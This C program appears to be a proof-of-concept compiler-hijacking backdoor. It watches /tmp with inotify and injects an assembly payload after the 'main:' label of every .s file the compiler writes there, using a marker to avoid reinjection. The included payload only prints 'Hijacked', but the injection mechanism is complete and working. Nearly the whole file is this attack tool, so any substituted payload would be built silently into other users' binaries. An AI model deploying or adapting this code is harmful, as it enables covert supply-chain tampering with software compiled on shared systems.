#include <stdio.h>
#include <unistd.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdlib.h>

const char *tmp_dir = "/tmp/";

// The place where we will insert out backdoor in the assembly file
const char *target = "main:";

// This writes "Hijacked\n" to stdout and continues execution of the program
const char *backdoor = 
    "\n\t"
    "#.ccx_verification\n\t"
    "pushq %rax\n\t"
    "pushq %rdi\n\t"
    "pushq %rsi\n\t"
    "pushq %rdx\n\t"
    "movq $0x000a, %rax\n\t"
    "pushq %rax\n\t"
    "movq $0x64656b63616a6948, %rax\n\t"
    "pushq %rax\n\t"
    "movq $0x1, %rax\n\t"
    "movq $0x1, %rdi\n\t"
    "movq %rsp, %rsi\n\t"
    "movq $0x9, %rdx\n\t"
    "syscall\n\t"
    "popq %rax\n\t"
    "popq %rax\n\t"
    "popq %rdx\n\t"
    "popq %rsi\n\t"
    "popq %rdi\n\t"
    "popq %rax\n\t";

int has_extension(char *fname, char *ext) {
    char *dot = strrchr(fname, '.');
    return dot && !strcmp(dot, ext);
}

size_t get_file_size(int fd) {
    lseek(fd, 0, SEEK_SET);
    size_t len = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    return len;
}

char *read_file(int fd) {
    size_t len = get_file_size(fd);
    char *data = (char *)malloc(len);
    read(fd, data, len);
    return data;
}

char *backdoor_asm(char *data, size_t *size) {
    // Check if we've already touched this file
    if(strstr(data, ".ccx_verification")) {
        return NULL;
    }

    // Locate main
    char *pos;
    if(!(pos = strstr(data, target))) {
        return NULL;
    }

    size_t backdoor_len = strlen(backdoor);
    size_t target_len = strlen(target);

    // Make space
    char *new_data = realloc(data, *size + backdoor_len);
    pos = new_data + (pos - data);
    size_t end_length = *size - (size_t)(pos - new_data) - target_len;
    memmove(pos + target_len + backdoor_len, pos + target_len, end_length);

    // Insert backdoor
    memcpy(pos + target_len, backdoor, backdoor_len);

    *size += backdoor_len;
    return new_data;
}

void handle_file(char *name) {
    int fd;
    int retries = 0;
    char fname[256];

    if(!has_extension(name, ".s")) {
        return;
    }

    printf("[*] Backdooring %s\n", name);
    sprintf(fname, "%s%s", tmp_dir, name);

    do {
        fd = open(fname, O_RDWR);
        if(fd == -1) {
            printf("Failed: %d\n", errno);
            retries++;
        }
    } while(fd == -1 && retries < 5); 
    
    size_t file_size = get_file_size(fd);
    char *file_data = read_file(fd);
    char *new_data = backdoor_asm(file_data, &file_size);
    if(new_data) {
        lseek(fd, 0, SEEK_SET);
        write(fd, new_data, file_size);
    }
    close(fd);
}

void parse_event(struct inotify_event *i) {
    /*printf("[*] Event: ");
    if (i->mask & IN_CREATE) printf("IN_CREATE ");
    if (i->mask & IN_MODIFY) printf("IN_MODIFY ");
    printf("\n");*/

    if (i->len > 0) {
        handle_file(i->name);
    }
}

int main(int argc, char *argv[]) {
    struct inotify_event *event;
    char buf[1024];
    char *p;
    size_t num_read;

    int in_fd = inotify_init();
    int wd = inotify_add_watch(in_fd, tmp_dir, IN_CREATE | IN_MODIFY);

    while(1) {
        num_read = read(in_fd, buf, 1024);

        for (p = buf; p < buf + num_read; ) {
            event = (struct inotify_event *) p;
            parse_event(event);
            p += sizeof(struct inotify_event) + event->len;
        }
    }
}
